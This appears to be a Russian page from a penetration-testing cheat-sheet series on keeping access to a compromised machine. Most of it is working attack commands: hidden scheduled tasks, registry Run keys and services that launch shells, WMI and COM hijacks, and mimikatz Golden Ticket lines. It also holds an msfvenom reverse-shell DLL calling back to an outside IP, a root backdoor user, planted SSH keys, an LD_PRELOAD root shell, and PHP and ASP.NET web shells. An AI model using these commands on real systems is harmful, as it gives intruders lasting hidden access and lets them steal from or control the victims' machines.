# 🔒 Этап 5: Закрепление

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[Английский оригинал](../05-Persistence.md) • [Русский указатель](../../README.ru.md)
[🇹🇷 Türkçe Sürüm](05-Persistence.tr.md) • [🇬🇷 Ελληνικά](05-Persistence.el.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Цель:** Сохранить доступ к скомпрометированной системе после перезагрузки или обнаружения.

---

## 🖥️ Закрепление в Windows

### Запланированные задания
```cmd
# Создать задание планировщика (выполняется от SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# От имени указанного пользователя
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# При запуске системы
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Каждый час
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Вывести список заданий
schtasks /query /fo LIST /v

# Удалить задание
schtasks /delete /tn "TaskName" /f
```

### Ключи автозапуска Run в реестре
```cmd
# HKCU — текущий пользователь (права администратора не нужны)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM — все пользователи (нужны права администратора)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (выполняется однократно, после чего запись удаляется)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Папка автозагрузки
```cmd
# Текущий пользователь
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Все пользователи (нужны права администратора)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Службы
```cmd
# Создать службу (нужны права администратора)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Изменить существующую службу
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### Подписки на события WMI
```powershell
# Создать механизм закрепления через WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### Перехват DLL / порядок поиска
```cmd
# Найти возможности перехвата загрузки DLL
# Разместить вредоносную DLL в каталоге приложения
# Типичные цели:
# - Программы, загружающие DLL без полного пути
# - Отсутствующие DLL

# Создать вредоносную DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Перехват COM (COM Hijacking)
```powershell
# Найти объекты COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Создать механизм перехвата
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden Ticket — сохранение привилегий администратора домена
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket — сохранение доступа к службе
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Закрепление в Linux

### Задания cron
```bash
# Пользовательская таблица crontab
crontab -e
# Добавить: * * * * * /tmp/shell.sh

# Системная таблица crontab
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Каталоги cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### Ключи SSH
```bash
# Добавить свой открытый ключ в authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Доступ root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Пользователь для скрытого доступа (backdoor)
```bash
# Добавить пользователя с привилегиями root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Или добавить запись непосредственно в /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### Исполняемый файл SUID
```bash
# Скопировать bash и установить SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Выполнить с правами root
/tmp/.hidden -p
```

### Служба systemd
```bash
# Создать файл службы
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Включить автозапуск и запустить
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Добавить в bashrc пользователя
echo '/tmp/shell &' >> ~/.bashrc

# Добавить в глобальный profile
echo '/tmp/shell &' >> /etc/profile

# Добавить в bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Создать вредоносную разделяемую библиотеку
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Добавить в LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Веб-оболочка (Web Shell)
```bash
# Веб-оболочка PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Более скрытый вариант
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Закрепление в веб-приложении

### Расположение веб-оболочек
```bash
# Типичные пути веб-оболочек
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### Веб-оболочка ASP.NET
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Краткий справочник

### Способы закрепления в Windows

| Способ | Расположение | Привилегии |
|--------|----------|-----------|
| Ключ Run реестра | HKCU/HKLM | Пользователь/администратор |
| Задание планировщика | Планировщик заданий | Пользователь/администратор |
| Папка автозагрузки | AppData/ProgramData | Пользователь/администратор |
| Служба | Службы | Администратор |
| WMI | Подписка WMI | Администратор |
| Перехват COM | HKCU CLSID | Пользователь |

### Способы закрепления в Linux

| Способ | Расположение | Привилегии |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| Ключи SSH | ~/.ssh/authorized_keys | Пользователь |
| SUID | Исполняемый файл с битом +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Пользователь |

---

## 🔗 Связанные шпаргалки

- [PowerShell](../../PowerShell/README.md)
- [Команды Linux](../../Linux-Commands/README.md)
- [Metasploit](../../Metasploit/README.md)

---

**Предыдущий этап:** [← 04 - Боковое перемещение](./04-Lateral-Movement.ru.md)

**Следующий этап:** [06 - Обход защиты →](./06-Defense-Evasion.ru.md)
